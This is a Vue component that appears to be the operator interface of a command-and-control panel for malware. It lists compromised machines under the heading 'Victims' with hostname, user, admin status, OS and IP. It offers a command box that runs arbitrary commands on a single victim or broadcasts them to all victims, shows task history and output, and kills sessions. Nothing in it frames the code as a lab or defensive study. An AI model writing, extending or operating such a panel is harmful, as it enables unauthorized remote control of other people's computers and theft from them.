<template>
  <div>
    <div class="page-header">
      <h1>Victims</h1>
      <span class="badge" v-if="sessions.length">{{ sessions.length }} online</span>
      <span class="badge muted" v-else>Awaiting connections...</span>
    </div>

    <!-- Victims Table -->
    <div class="table-wrap">
      <table class="table">
        <thead>
          <tr>
            <th style="width:40px"></th>
            <th>Hostname</th>
            <th>User</th>
            <th>OS</th>
            <th>Arch</th>
            <th>IP</th>
            <th>Status</th>
            <th style="width:80px">Actions</th>
          </tr>
        </thead>
        <tbody>
          <tr v-for="s in sessions" :key="s.ID" @click="toggleExpand(s.ID)" class="row" :class="{expanded: expanded === s.ID}">
            <td><span class="expand-icon">{{ expanded === s.ID ? '▾' : '▸' }}</span></td>
            <td class="mono fw6">{{ s.Hostname || '?' }}</td>
            <td>{{ s.Username || '?' }}<span v-if="s.IsAdmin" class="admin-tag">ADMIN</span></td>
            <td><span class="os-tag" :class="osClass(s.OS)">{{ s.OS || '?' }}</span></td>
            <td class="mono small">{{ s.Arch || '?' }}</td>
            <td class="mono small">{{ s.PublicIP || s.LocalIP || '—' }}</td>
            <td><span class="dot" :class="s.State==='active'?'green':'gray'"></span>{{ s.State }}</td>
            <td><button @click.stop="killSession(s.ID)" class="kill-btn">Kill</button></td>
          </tr>
        </tbody>
      </table>

      <!-- Expanded Session Detail -->
      <div v-if="expanded && expandedSession" class="detail-panel animate-in">
        <div class="detail-grid">
          <div class="detail-item"><label>Session ID</label><code>{{ expandedSession.ID }}</code></div>
          <div class="detail-item"><label>Agent ID</label><code>{{ expandedSession.AgentID || '—' }}</code></div>
          <div class="detail-item"><label>OS</label><span>{{ expandedSession.OS }} {{ expandedSession.Arch }}</span></div>
          <div class="detail-item"><label>User</label><span>{{ expandedSession.Username }} <span v-if="expandedSession.IsAdmin" class="admin-tag">ADMIN</span></span></div>
          <div class="detail-item"><label>Hostname</label><span>{{ expandedSession.Hostname }}</span></div>
          <div class="detail-item"><label>State</label><span class="dot" :class="expandedSession.State==='active'?'green':'gray'"></span> {{ expandedSession.State }}</div>
          <div class="detail-item"><label>First Seen</label><span>{{ fmtDate(expandedSession.FirstSeen) }}</span></div>
          <div class="detail-item"><label>Last Seen</label><span>{{ fmtDate(expandedSession.LastSeen) }}</span></div>
          <div class="detail-item"><label>Tasks</label><span>{{ expandedSession.TaskCount || 0 }}</span></div>
        </div>

        <!-- Task History -->
        <div v-if="sessionTasks.length" class="task-history">
          <h3>Recent Tasks</h3>
          <div v-for="t in sessionTasks.slice(0, 10)" :key="t.ID" class="task-row">
            <span class="mono cmd-text">$ {{ t.Command }}</span>
            <pre class="task-output">{{ t.Output || '(pending)' }}</pre>
          </div>
        </div>
      </div>
    </div>

    <!-- Command Box (always visible at bottom) -->
    <div class="cmd-bar">
      <select v-model="targetAgent" class="cmd-select">
        <option value="">ALL VICTIMS (broadcast)</option>
        <option v-for="s in sessions" :key="s.ID" :value="s.ID">{{ s.Hostname }} ({{ s.Username }})</option>
      </select>
      <input v-model="cmd" @keyup.enter="execCmd" class="cmd-input" placeholder="command..." />
      <button @click="execCmd" class="cmd-btn" :disabled="executing">{{ executing ? 'Executing...' : 'Execute' }}</button>
    </div>

    <!-- Command Output -->
    <pre v-if="cmdOutput" class="cmd-output animate-in" :class="{'error-output': cmdError}">{{ cmdOutput }}</pre>
  </div>
</template>

<script>
export default {
  data() {
    return {
      sessions: [], expanded: null, sessionTasks: [], cmd: '', targetAgent: '', cmdOutput: '', cmdError: false, executing: false, timer: null
    }
  },
  computed: {
    expandedSession() { return this.sessions.find(s => s.ID === this.expanded) }
  },
  mounted() {
    this.fetch()
    this.timer = setInterval(() => this.fetch(), 4000)
  },
  beforeUnmount() { clearInterval(this.timer) },
  methods: {
    auth() {
      const token = sessionStorage.getItem('bty_token')
      return token ? { Authorization: 'Bearer ' + token } : {}
    },
    async fetch() {
      try {
        const r = await fetch('/api/sessions', { headers: this.auth() })
        if (r.status === 401) {
          this.$router.push('/login')
          return
        }
        this.sessions = await r.json() || []
      } catch (e) {
        console.error('Failed to fetch sessions:', e)
      }
    },
    async toggleExpand(id) {
      if (this.expanded === id) { this.expanded = null; return }
      this.expanded = id
      try {
        const r = await fetch('/api/sessions/' + id, { headers: this.auth() })
        const d = await r.json()
        this.sessionTasks = d.tasks || []
      } catch (e) {
        console.error('Failed to fetch session tasks:', e)
      }
    },
    async execCmd() {
      if (!this.cmd || this.executing) return
      this.executing = true
      this.cmdOutput = ''
      this.cmdError = false
      const url = this.targetAgent ? '/api/cmd' : '/api/broadcast'
      const body = this.targetAgent
        ? JSON.stringify({ agent_id: this.targetAgent, command: this.cmd, timeout: 30 })
        : JSON.stringify({ command: this.cmd })
      try {
        const r = await fetch(url, {
          method: 'POST',
          headers: { ...this.auth(), 'Content-Type': 'application/json' },
          body
        })
        if (r.status === 401) {
          this.$router.push('/login')
          return
        }
        const j = await r.json()
        if (!r.ok) {
          this.cmdOutput = 'Error: ' + (j.error || r.statusText)
          this.cmdError = true
        } else {
          this.cmdOutput = typeof j === 'string' ? j : (j.output || JSON.stringify(j, null, 2))
        }
      } catch (e) {
        this.cmdOutput = 'Connection error: ' + e.message
        this.cmdError = true
      }
      this.cmd = ''
      this.executing = false
    },
    async killSession(id) {
      if (!confirm('Kill this session?')) return
      try {
        const r = await fetch('/api/sessions/' + id, { method: 'DELETE', headers: this.auth() })
        if (r.ok) {
          this.expanded = null
          this.fetch()
        }
      } catch (e) {
        console.error('Failed to kill session:', e)
      }
    },
    osClass(os) {
      const m = { linux: 'os-linux', windows: 'os-win', darwin: 'os-mac' }
      return m[os] || ''
    },
    fmtDate(d) { return d ? new Date(d).toLocaleString() : '—' }
  }
}
</script>

<style scoped>
.page-header{display:flex;align-items:center;gap:12px;margin-bottom:20px}
.page-header h1{font-size:22px;font-weight:700;color:#111827}
.badge{font-size:12px;background:#ecfdf5;color:#059669;padding:3px 10px;border-radius:20px;font-weight:500;font-family:'JetBrains Mono',monospace}
.badge.muted{background:#f3f4f6;color:#9ca3af}
.table-wrap{background:#fff;border:1px solid #e5e7eb;border-radius:10px;overflow:hidden}
.table{width:100%;border-collapse:collapse;font-size:13px}
.table th{text-align:left;padding:10px 14px;font-size:11px;font-weight:600;color:#9ca3af;text-transform:uppercase;letter-spacing:.05em;background:#fafbfc;border-bottom:1px solid #e5e7eb}
.table td{padding:10px 14px;border-bottom:1px solid #f3f4f6;color:#374151}
.row{cursor:pointer;transition:background .1s}
.row:hover{background:#f9fafb}
.row.expanded{background:#f0fdf4}
.expand-icon{color:#9ca3af;font-size:12px}
.mono{font-family:'JetBrains Mono',monospace}
.fw6{font-weight:600}
.small{font-size:12px}
.dot{display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:6px}
.dot.green{background:#10b981}
.dot.gray{background:#d1d5db}
.os-tag{font-size:11px;padding:1px 6px;border-radius:4px;font-weight:500}
.os-linux{background:#fef3c7;color:#92400e}
.os-win{background:#dbeafe;color:#1e40af}
.os-mac{background:#f3f4f6;color:#374151}
.admin-tag{font-size:10px;background:#fee2e2;color:#dc2626;padding:1px 5px;border-radius:3px;margin-left:6px;font-weight:600}
.kill-btn{font-size:11px;color:#ef4444;background:none;border:1px solid #fecaca;padding:2px 8px;border-radius:4px;cursor:pointer}
.kill-btn:hover{background:#fef2f2}
.detail-panel{padding:20px 24px;border-top:2px solid #059669;background:#fafcfb}
.detail-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:16px}
.detail-item label{display:block;font-size:11px;color:#9ca3af;text-transform:uppercase;margin-bottom:2px}
.detail-item code,.detail-item span{font-size:13px;color:#1f2937;font-family:'JetBrains Mono',monospace}
.task-history h3{font-size:13px;font-weight:600;color:#374151;margin-bottom:8px}
.task-row{margin-bottom:8px}
.cmd-text{font-size:12px;color:#059669;margin-bottom:2px;display:block}
.task-output{font-size:11px;color:#6b7280;background:#f3f4f6;padding:6px 10px;border-radius:6px;max-height:160px;overflow-y:auto;white-space:pre-wrap;font-family:'JetBrains Mono',monospace}
.cmd-bar{display:flex;gap:8px;margin-top:20px;background:#fff;border:1px solid #e5e7eb;border-radius:10px;padding:6px}
.cmd-select{font-size:12px;border:1px solid #e5e7eb;border-radius:6px;padding:8px 12px;outline:none;font-family:'JetBrains Mono',monospace;min-width:200px;background:#fff}
.cmd-input{flex:1;font-size:13px;border:1px solid #e5e7eb;border-radius:6px;padding:8px 14px;outline:none;font-family:'JetBrains Mono',monospace;transition:border-color .2s}
.cmd-input:focus{border-color:#059669}
.cmd-btn{padding:8px 20px;background:#059669;color:#fff;border:none;border-radius:6px;font-size:13px;font-weight:600;cursor:pointer;white-space:nowrap;transition:background .2s}
.cmd-btn:hover{background:#047857}
.cmd-btn:disabled{opacity:.5;cursor:not-allowed}
.cmd-output{margin-top:12px;background:#fff;border:1px solid #e5e7eb;border-radius:10px;padding:16px;font-family:'JetBrains Mono',monospace;font-size:12px;color:#1f2937;max-height:300px;overflow-y:auto;white-space:pre-wrap}
.cmd-output.error-output{background:#fef2f2;border-color:#fecaca;color:#dc2626}
.animate-in{animation:fadeIn .3s ease}
@keyframes fadeIn{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:translateY(0)}}
</style>
